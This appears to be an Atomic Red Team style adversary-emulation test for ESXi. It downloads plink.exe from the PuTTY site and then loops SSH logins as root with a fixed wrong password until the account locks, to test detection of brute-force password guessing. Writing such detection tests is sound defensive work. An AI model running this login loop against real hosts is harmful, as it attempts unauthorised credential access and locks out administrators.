api_version: "2.0"
name: ESXi - Brute Force Until Account Lockout
description: |
    An adversary may attempt to brute force the password of privilleged account for privilege escalation.
    In the process, the TA may lock the account, which can be used for detection. [Reference](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/#:~:text=A%20ransomware%20group%20attacking%20large,internal%20systems%20after%20establishing%20a)
args:
    - name: vm_host
      type: string
      default: atomic.local
    - name: plink_file
      type: path
      default: PathToAtomicsFolder\..\ExternalPayloads\plink.exe
    - name: lockout_threshold
      type: string
      default: "5"
uuid: ed6c2c87-bba6-4a28-ac6e-c8af3d6c2ab5
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1110: Brute Force'
    subtechniques:
        - 'T1110.001: Password Guessing'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        The plink executable must be found in the ExternalPayloads folder.
      inline: |
        if (Test-Path "#{plink_file}") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
        Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" -OutFile "#{plink_file}"
        }}
      executor: powershell
    - name: esxi---brute-force-until-account-lockout
      inline: |
        $lockout_threshold = [int]"{{.Args.lockout_threshold}}"
        for ($var = 1; $var -le $lockout_threshold; $var++) {
          {{.Args.plink_file}} -ssh "{{.Args.vm_host}}" -l root -pw f0b443ae-9565-11ee-b9d1-0242ac120002
          }
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
